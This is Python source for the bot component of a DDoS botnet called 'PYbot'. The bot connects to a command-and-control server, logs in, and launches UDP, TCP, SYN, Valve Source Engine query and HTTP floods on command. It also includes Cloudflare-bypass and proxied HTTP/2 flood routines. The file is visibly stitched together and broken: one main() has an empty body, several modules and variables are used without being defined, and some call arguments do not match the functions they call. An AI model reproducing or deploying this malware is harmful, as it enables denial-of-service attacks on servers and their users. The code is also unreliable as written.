# PYbot - A simple Python botnet
# Author: WodX
# Date: 27/09/2019
# Bot

import socket 
import threading
import time
import random

# Configuration
C2_ADDRESS  = '127.0.0.1'
C2_PORT     = 9999

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def attack_vse(ip, port, secs):
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def attack_udp(ip, secs, port):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            socket.gethostbyname(ip)
            pack = 1021
            punch = random._urandom(int(pack))
            threading.Thread(target=randsender, args=(ip, secs, port, punch)).start()
        except:
            pass

def attack_tcp(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            socket.gethostbyname(ip)
            pack = 20179
            punch = random._urandom(int(pack))
            threading.Thread(target=randsender, args=(ip, secs, port, punch)).start()
        except:
            pass


fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(ip, secs, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(secs)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (ip, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1
              
              


def stdsender(ip, secs, port, payload):
    global atks
    global running

    timeout = time.time() + float(secs)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

def get_info():
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.WHITE)
    target = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.WHITE)
    thread = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.WHITE)
    t = input()
    return target, thread, t
#endregion


def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass


def attack_syn(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        try:
            dport = random.randint(1, 65535) if port == 0 else port
            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
        except:
            pass

def attack_http(ip, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, 5050))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break

            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break

            break
        except:
            time.sleep(120) # retry in 2 mins if connection fails

    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].upper()

            if command == '.VSE':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()

            elif command == '.UDP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                pack = 666
                punch = random._urandom(int(pack))

                for _ in range(threads):
                    threading.Thread(target=randsender, args=(ip, secs, port, punch)).start()

            elif command == '.TCP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

            elif command == '.SYN':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()

            elif command == '.HTTP':
                ip = args[1]
                secs = time.time() + int(args[2])
                threads = int(args[3])

                for _ in range(threads):
                    threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()

            elif command == 'PING':
                c2.send('PONG'.encode())

        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass